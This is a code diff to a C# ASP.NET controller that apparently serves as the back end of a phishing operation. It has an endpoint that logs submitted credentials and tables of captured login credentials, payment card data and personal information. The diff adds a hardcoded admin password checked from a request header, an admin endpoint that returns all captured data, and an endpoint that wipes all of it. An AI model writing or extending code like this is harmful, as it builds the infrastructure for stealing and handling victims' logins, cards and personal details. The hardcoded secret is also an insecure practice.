@@ -8,6 +8,14 @@ namespace WebApiSolution.Controllers;
 [Route("api/log")]
 public class LogController(AppDbContext db) : ControllerBase
 {
+    private const string AdminPassword = "TechShop2026!";
+
+    private bool IsAuthorized()
+    {
+        Request.Headers.TryGetValue("X-Admin-Password", out var pw);
+        return pw == AdminPassword;
+    }
+
     [HttpPost]
     public async Task<IActionResult> LogCredentials([FromBody] LogEntry entry)
     {
@@ -48,10 +56,24 @@ public class LogController(AppDbContext db) : ControllerBase
     [HttpGet("admin")]
     public async Task<IActionResult> GetAll()
     {
+        if (!IsAuthorized()) return Unauthorized(new { message = "Invalid password" });
+
         var credentials = db.LogEntries.OrderByDescending(x => x.CapturedAt).ToList();
         var cards = db.CardEntries.OrderByDescending(x => x.CapturedAt).ToList();
         var personal = db.PersonalInfoEntries.OrderByDescending(x => x.CapturedAt).ToList();
 
         return Ok(new { credentials, cards, personal });
+    }
+
+    [HttpDelete("admin/clear")]
+    public async Task<IActionResult> Clear()
+    {
+        if (!IsAuthorized()) return Unauthorized(new { message = "Invalid password" });
+
+        db.LogEntries.RemoveRange(db.LogEntries);
+        db.CardEntries.RemoveRange(db.CardEntries);
+        db.PersonalInfoEntries.RemoveRange(db.PersonalInfoEntries);
+        await db.SaveChangesAsync();
+        return Ok();
     }
 }
